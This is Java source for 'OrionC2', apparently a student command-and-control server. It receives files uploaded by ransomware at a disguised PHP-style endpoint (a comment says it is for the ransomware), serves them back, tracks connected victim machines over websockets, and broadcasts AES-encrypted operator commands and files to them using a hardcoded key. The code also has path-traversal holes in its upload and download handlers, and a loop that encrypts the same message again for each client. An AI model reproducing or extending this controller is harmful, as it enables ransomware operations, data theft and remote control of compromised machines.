// =============================================================================
// Project Name: OrionC2
// File: Main.java
//
// Copyright (c) 2026 Alban LEAUTIER
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
// =============================================================================
package org.esisar.command_control;

import io.javalin.Javalin;
import io.javalin.http.UploadedFile;
import io.javalin.websocket.WsContext;
import org.esisar.command_control.encrypt.AES;
import org.esisar.command_control.server_logic.Client;

import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Scanner;


public class Main {

    static ArrayList<Client> clients = new ArrayList<>();
    static String cheminFichier = "C:/Users/quent/Desktop/musique sheet/howlabr.pdf";

    public static void main(String[] args) {
        // Javalin app = Javalin.create().start(7000);
    	String cle = "azertyuiopqsdfgh";

        AES aes = new AES(cle);

        Javalin app = Javalin.create(config -> {
            config.jetty.modifyWebSocketServletFactory(factory -> {
                factory.setIdleTimeout(Duration.ofHours(2)); // on définit le temps de Timeout à 2heures pour pas etre emmerdé
            });
        }).start(7000);


       //Le http pour le ransownwra
        app.post("/gadfTs55sghsSSS/phppost.php", ctx -> {
            // Recuperation du fichier
            UploadedFile file = ctx.uploadedFile("file");

            if (file != null) {
                // Traitement
                Path destination = Paths.get("uploads/" + file.filename());
                Files.createDirectories(destination.getParent());
                Files.copy(file.content(), destination);

                // autre paramétre du form (peut être pas utile
                String description = ctx.formParam("description");
                System.out.println("Fichier '" + file.filename() + "' reçu avec succès ! ");
                ctx.result("Fichier '" + file.filename() + "' reçu avec succès ! " +
                           "Description : " + description);
            } else {
                ctx.status(400).result("Aucun fichier trouvé dans la requête.");
            }
        });
    
        
        app.get("/gadfTs55sghsSSS/{filename}", ctx -> {
            String filename = ctx.pathParam("filename");
            Path filePath = Paths.get("uploads/" + filename);

            if (Files.exists(filePath)) {
                ctx.contentType(Files.probeContentType(filePath));
                ctx.result(Files.newInputStream(filePath));
            } else {
                ctx.status(404).result("Fichier non trouvé");
            }
        });
        
        app.ws("/", ws -> {
            ws.onConnect(ctx -> {

                System.out.println("Machine " + ctx.sessionId() + " connected");
                Client client = new Client(ctx);
                clients.add(client);


                // TODO : logique du "HandShake"
            });

            ws.onMessage(ctx -> {
                //Gestion anti déconection => obligé pour éviter que les rooters nous emmerdent.
                if (ctx.message().equals("Ping")) {
                    System.out.println("Pong");
                    ctx.send("Pong");
                } else {
                    System.out.println(ctx.message());
                }

            });

            //
            ws.onClose(ctx -> {
                System.out.println("Machine " + ctx.sessionId() + " disconnected");
                for (Client client : clients) {
                    if (ctx.sessionId().equals(client.getSessionId())) {
                        clients.remove(client);
                    }
                    //client... client... CLIENT AAAAAAAAAAAAAAAAAAAA
                }
            });
        });

        app.ws("/download", ws -> {
            ws.onConnect(ctx -> {
                System.out.println("Machine " + ctx.sessionId() + " out to download.");

                //TODO : ENVOIE LE FICHIER QUE LE CLIENT VEUT !
                sendFile(cheminFichier, ctx);

            });
        });

        // Le parseur  (désolé Béatrice <3)
        Thread consoleReader = new Thread(() -> {
            Scanner scanner = new Scanner(System.in);
            System.out.println("> Entrer Commande");

            while (true) {
                if (scanner.hasNextLine()) {
                    String message = scanner.nextLine();
                    System.out.println("> Entrer Commande");
                    if(message.startsWith("download")){ cheminFichier = message.split(" ")[1];}
                    for (Client client : clients) {
                    	message = aes.encrypt(message);
                        client.sendMessage(message);
                    }
                }
            }
        });


        consoleReader.setDaemon(true); // S'arrête si le serveur s'arrête
        consoleReader.start();
    }




    private static void sendFile(String cheminFichier, WsContext ctx) {
        try {
            byte[] donneesFichier = Files.readAllBytes(Path.of(cheminFichier));
            ByteBuffer buffer = ByteBuffer.wrap(donneesFichier);
            ctx.send(buffer);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

